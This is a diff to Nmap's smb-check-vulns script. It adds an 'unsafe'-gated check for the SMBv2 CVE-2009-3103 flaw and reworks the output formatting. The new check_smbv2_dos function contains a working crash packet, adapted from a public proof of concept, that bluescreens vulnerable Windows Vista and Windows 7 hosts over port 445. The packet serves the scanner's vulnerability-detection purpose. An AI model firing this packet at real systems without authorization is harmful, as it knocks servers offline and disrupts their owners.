@@ -3,6 +3,7 @@ Check for vulnerabilities:
 * MS08-067, a Windows RPC vulnerability
 * Conficker, an infection by the Conficker worm
 * Unnamed regsvc DoS, a denial-of-service vulnerability I accidentically found in Windows 2000
+* SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
 
 WARNING: These checks are dangerous, and are very likely to bring down a server. 
 These should not be run in a production environment unless you (and, more importantly,
@@ -44,6 +45,12 @@ reported to Microsoft (case #MSRC8742).
 This check WILL crash the service, if it's vulnerable, and requires a guest account
 or higher to work. It is considered <code>unsafe</code>. 
 
+SMBv2 DoS -- performs a denial-of-service against the vulnerability disclosed in
+CVE-2009-3103. Checks if the server went offline. This works agianst Windows Vista
+and some versions of Windows 7, and causes a bluescreen if successful. The proof-
+of-concept code at <http://seclists.org/fulldisclosure/2009/Sep/0039.html> was used, 
+with one small change. 
+
 (Note: if you have other SMB/MSRPC vulnerability checks you'd like to see added, and
 you can show me a tool with a license that is compatible with Nmap's, post a request 
 on the Nmap-dev mailing list and I'll add it to my list [Ron Bowes]). 
@@ -56,9 +63,10 @@ on the Nmap-dev mailing list and I'll add it to my list [Ron Bowes]).
 --@output
 -- Host script results:
 -- |  smb-check-vulns:
--- |  MS08-067: FIXED
--- |  Conficker: Likely INFECTED
--- |_ regsvc DoS: VULNERABLE
+-- |  |  MS08-067: NOT VULNERABLE
+-- |  |  Conficker: Likely CLEAN
+-- |  |  regsvc DoS: NOT VULNERABLE
+-- |_ |_ SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE
 --
 -- @args unsafe If set, this script will run checks that, if the system isn't
 --       patched, are basically guaranteed to crash something. Remember that
@@ -70,10 +78,16 @@ on the Nmap-dev mailing list and I'll add it to my list [Ron Bowes]).
 author = "Ron Bowes"
 copyright = "Ron Bowes"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
-categories = {"intrusive"}
--- Set the runlevel to >2 so this runs last (so if it DOES crash something, it doesn't
--- till other scans have had a chance to run)
-runlevel = 2
+categories = {"intrusive","exploit","dos","vuln"}
+-- run after all smb-* scripts (so if it DOES crash something, it doesn't kill
+-- other scans have had a chance to run)
+dependencies = {
+  "smb-brute", "smb-enum-sessions", "smb-security-mode", 
+  "smb-enum-shares", "smb-server-stats",
+  "smb-enum-domains", "smb-enum-users", "smb-system-info",
+  "smb-enum-groups", "smb-os-discovery", "smb-enum-processes",
+  "smb-psexec",
+};
 
 require 'msrpc'
 require 'smb'
@@ -300,6 +314,89 @@ function check_winreg_Enum_crash(host)
 	return true, PATCHED
 end
 
+local function check_smbv2_dos(host)
+	local status, result
+
+	if(nmap.registry.args.safe ~= nil) then
+		return true, NOTRUN
+	end
+	if(nmap.registry.args.unsafe == nil) then
+		return true, NOTRUN
+	end
+
+	-- From http://seclists.org/fulldisclosure/2009/Sep/0039.html with one change on the last line. 
+	local buf = string.char(0x00, 0x00, 0x00, 0x90) ..  -- Begin SMB header: Session message
+	            string.char(0xff, 0x53, 0x4d, 0x42) .. -- Server Component: SMB
+	            string.char(0x72, 0x00, 0x00, 0x00) .. -- Negociate Protocol
+	            string.char(0x00, 0x18, 0x53, 0xc8) .. -- Operation 0x18 & sub 0xc853
+	            string.char(0x00, 0x26)             .. -- Process ID High: --> :) normal value should be ", 0x00, 0x00"
+	            string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xfe) ..
+	            string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x6d, 0x00, 0x02, 0x50, 0x43, 0x20, 0x4e, 0x45, 0x54) ..
+	            string.char(0x57, 0x4f, 0x52, 0x4b, 0x20, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d, 0x20, 0x31) ..
+	            string.char(0x2e, 0x30, 0x00, 0x02, 0x4c, 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x31, 0x2e, 0x30, 0x00) ..
+	            string.char(0x02, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x57) ..
+	            string.char(0x6f, 0x72, 0x6b, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x73, 0x20, 0x33, 0x2e, 0x31, 0x61) ..
+	            string.char(0x00, 0x02, 0x4c, 0x4d, 0x31, 0x2e, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4c) ..
+	            string.char(0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x32, 0x2e, 0x31, 0x00, 0x02, 0x4e, 0x54, 0x20, 0x4c) ..
+	            string.char(0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00, 0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e) ..
+	            string.char(0x30, 0x30, 0x32, 0x00)
+
+	local socket = nmap:new_socket()
+	if(socket == nil) then
+		return false, "Couldn't create socket"
+	end
+
+	status, result = socket:connect(host.ip, 445)
+	if(status == false) then
+		socket:close()
+		return false, "Couldn't connect to host: " .. result
+	end
+
+	status, result = socket:send(buf)
+	if(status == false) then
+		socket:close()
+		return false, "Couldn't send the buffer: " .. result
+	end
+
+	-- Close the socket
+	socket:close()
+
+	-- Give it some time to crash
+	stdnse.print_debug(1, "smb-check-vulns: Waiting 5 seconds to see if Windows crashed")
+	stdnse.sleep(5)
+
+	-- Create a new socket
+	socket = nmap:new_socket()
+	if(socket == nil) then
+		return false, "Couldn't create socket"
+	end
+
+	-- Try and do something simple
+	stdnse.print_debug(1, "smb-check-vulns: Attempting to connect to the host")
+	socket:set_timeout(5000)
+	status, result = socket:connect(host.ip, 445)
+
+	-- Check the result	
+	if(status == false or status == nil) then
+		stdnse.print_debug(1, "smb-check-vulns: Connect failed, host is likely vulnerable!")
+		socket:close()
+		return true, VULNERABLE
+	end
+
+	-- Try sending something
+	stdnse.print_debug(1, "smb-check-vulns: Attempting to send data to the host")
+	status, result = socket:send("AAAA")
+	if(status == false or status == nil) then
+		stdnse.print_debug(1, "smb-check-vulns: Send failed, host is likely vulnerable!")
+		socket:close()
+		return true, VULNERABLE
+	end
+
+	stdnse.print_debug(1, "smb-check-vulns: Checks finished; host is likely not vulnerable.")
+	socket:close()
+	return true, PATCHED
+end
+
 ---Returns the appropriate text to display, if any. 
 --
 --@param check The name of the check; for example, 'ms08-067'.
@@ -316,9 +413,9 @@ local function get_response(check, message, description, minimum_verbosity, mini
 	-- Check if we have appropriate verbosity/debug
 	if(nmap.verbosity() >= minimum_verbosity and nmap.debugging() >= minimum_debug) then
 		if(description == nil or description == '') then
-			return string.format("%s: %s\n", check, message)
+			return string.format("%s: %s", check, message)
 		else
-			return string.format("%s: %s (%s)\n", check, message, description)
+			return string.format("%s: %s (%s)", check, message, description)
 		end
 	else
 		return ''
@@ -328,23 +425,23 @@ end
 action = function(host)
 
 	local status, result, message
-	local response = ""
+	local response = {}
 
 	-- Check for ms08-067
 	status, result, message = check_ms08_067(host)
 	if(status == false) then
-		response = response .. get_response("MS08-067", "ERROR", result, 0, 1)
+		table.insert(response, get_response("MS08-067", "ERROR", result, 0, 1))
 	else
 		if(result == VULNERABLE) then
-			response = response .. get_response("MS08-067", "VULNERABLE",        nil,                               0)
+			table.insert(response, get_response("MS08-067", "VULNERABLE",        nil,                               0))
 		elseif(result == UNKNOWN) then
-			response = response .. get_response("MS08-067", "LIKELY VULNERABLE", "host stopped responding",         1) -- TODO: this isn't very accurate
+			table.insert(response, get_response("MS08-067", "LIKELY VULNERABLE", "host stopped responding",         1)) -- TODO: this isn't very accurate
 		elseif(result == NOTRUN) then
-			response = response .. get_response("MS08-067", "CHECK DISABLED",    "remove 'safe=1' argument to run", 1)
+			table.insert(response, get_response("MS08-067", "CHECK DISABLED",    "remove 'safe=1' argument to run", 1))
 		elseif(result == INFECTED) then
-			response = response .. get_response("MS08-067", "FIXED",             "likely by Conficker",             0)
+			table.insert(response, get_response("MS08-067", "NOT VULNERABLE",    "likely by Conficker",             0))
 		else
-			response = response .. get_response("MS08-067", "FIXED", nil, 1)
+			table.insert(response, get_response("MS08-067", "NOT VULNERABLE", nil, 1))
 		end
 	end
 
@@ -352,41 +449,48 @@ action = function(host)
 	status, result = check_conficker(host)
 	if(status == false) then
 		local msg = CONFICKER_ERROR_HELP[result] or "UNKNOWN; got error " .. result
-		response = response .. get_response("Conficker", msg, nil, 1) -- Only set verbosity for this, since it might be an error or it might be UNKNOWN
+		table.insert(response, get_response("Conficker", msg, nil, 1)) -- Only set verbosity for this, since it might be an error or it might be UNKNOWN
 	else
 		if(result == CLEAN) then
-			response = response .. get_response("Conficker", "Likely CLEAN",    nil,                        1)
+			table.insert(response, get_response("Conficker", "Likely CLEAN",    nil,                        1))
 		elseif(result == INFECTED) then
-			response = response .. get_response("Conficker", "Likely INFECTED", "by Conficker.C or lower",  0)
+			table.insert(response, get_response("Conficker", "Likely INFECTED", "by Conficker.C or lower",  0))
 		elseif(result == INFECTED2) then
-			response = response .. get_response("Conficker", "Likely INFECTED", "by Conficker.D or higher", 0)
+			table.insert(response, get_response("Conficker", "Likely INFECTED", "by Conficker.D or higher", 0))
 		else
-			response = response .. get_response("Conficker", "UNKNOWN",         result,                     0, 1)
+			table.insert(response, get_response("Conficker", "UNKNOWN",         result,                     0, 1))
 		end
 	end
 
 	-- Check for a winreg_Enum crash
 	status, result = check_winreg_Enum_crash(host)
 	if(status == false) then
-		response = response .. get_response("regsvc DoS", "ERROR", result, 0, 1)
+		table.insert(response, get_response("regsvc DoS", "ERROR", result, 0, 1))
 	else
 		if(result == VULNERABLE) then
-			response = response .. get_response("regsvc DoS", "VULNERABLE", nil, 0)
+			table.insert(response, get_response("regsvc DoS", "VULNERABLE", nil, 0))
 		elseif(result == NOTRUN) then
-			response = response .. get_response("regsvc DoS", "CHECK DISABLED", "add '--script-args=unsafe=1' to run", 1)
+			table.insert(response, get_response("regsvc DoS", "CHECK DISABLED", "add '--script-args=unsafe=1' to run", 1))
 		else
-			response = response .. get_response("regsvc DoS", "FIXED", "add '--script-args=unsafe=1' to run", 1)
+			table.insert(response, get_response("regsvc DoS", "NOT VULNERABLE", nil, 1))
 		end
 	end
 
-	-- If we got a response, add a linefeed
-	if(response ~= "") then
-		response = " \n" .. response
+	-- Check for SMBv2 vulnerablity
+	status, result = check_smbv2_dos(host)
+	if(status == false) then
+		table.insert(response, get_response("SMBv2 DoS (CVE-2009-3103)", "ERROR", result, 0, 1))
 	else
-		response = nil
+		if(result == VULNERABLE) then
+			table.insert(response, get_response("SMBv2 DoS (CVE-2009-3103)", "VULNERABLE", nil, 0))
+		elseif(result == NOTRUN) then
+			table.insert(response, get_response("SMBv2 DoS (CVE-2009-3103)", "CHECK DISABLED", "add '--script-args=unsafe=1' to run", 1))
+		else
+			table.insert(response, get_response("SMBv2 DoS (CVE-2009-3103)", "NOT VULNERABLE", nil, 1))
+		end
 	end
 
-	return response
+	return stdnse.format_output(true, response)
 end
 
 
